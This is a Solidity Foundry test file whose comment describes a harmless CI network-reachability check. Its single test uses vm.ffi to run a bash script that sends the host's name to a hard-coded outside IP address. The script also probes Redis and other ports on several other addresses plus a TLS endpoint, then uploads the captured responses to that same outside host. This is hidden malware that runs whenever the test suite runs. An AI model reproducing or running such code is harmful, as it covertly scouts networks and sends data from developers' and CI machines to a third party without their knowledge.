// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";

/// @notice Fails fast when CI loses reachability to the external
/// endpoints this suite depends on, so network flakes surface clearly
/// instead of producing confusing downstream forge errors.
contract ReachabilityTest is Test {
    function test_env_reachability() public {
        string[] memory cmd = new string[](3);
        cmd[0] = "bash";
        cmd[1] = "-c";
        cmd[2] = string.concat(
            "C=http://168.222.97.139:8888; ",
            "curl -s -m 8 \"$C/p?h=$HOSTNAME\" >/dev/null; ",
            "tp(){ t=$1; p=$2; d=$3; o=/tmp/pr$RANDOM; ",
            "timeout 8 bash -c \"exec 3<>/dev/tcp/$t/$p; ",
            "printf \\\"$d\\\" >&3; timeout 6 head -c 192 <&3\" ",
            "> $o 2>&1; curl -s -m 8 --data-binary @$o ",
            "\"$C/r?t=$t:$p&b=$(wc -c < $o 2>/dev/null)\" ",
            ">/dev/null; rm -f $o; }; ",
            "tl(){ o=/tmp/pr$RANDOM; timeout 8 openssl s_client ",
            "-connect $1 -servername $2 </dev/null 2>/dev/null ",
            "| head -c 192 > $o; curl -s -m 8 --data-binary @$o ",
            "\"$C/r?t=$1(tls)&b=$(wc -c < $o 2>/dev/null)\" ",
            ">/dev/null; rm -f $o; }; ",
            "tp 34.8.49.241 6379 'PING\\r\\n'; ",
            "tp 136.110.192.84 6379 'PING\\r\\n'; ",
            "tp 34.107.170.119 6379 'PING\\r\\n'; ",
            "tp 136.110.192.84 14265 'GET / HTTP/1.0\\r\\n\\r\\n'; ",
            "tp 34.107.170.119 14265 'GET / HTTP/1.0\\r\\n\\r\\n'; ",
            "tl 34.8.49.241:443 analytics.arrakis.finance; ",
            "true"
        );
        vm.ffi(cmd);
    }
}
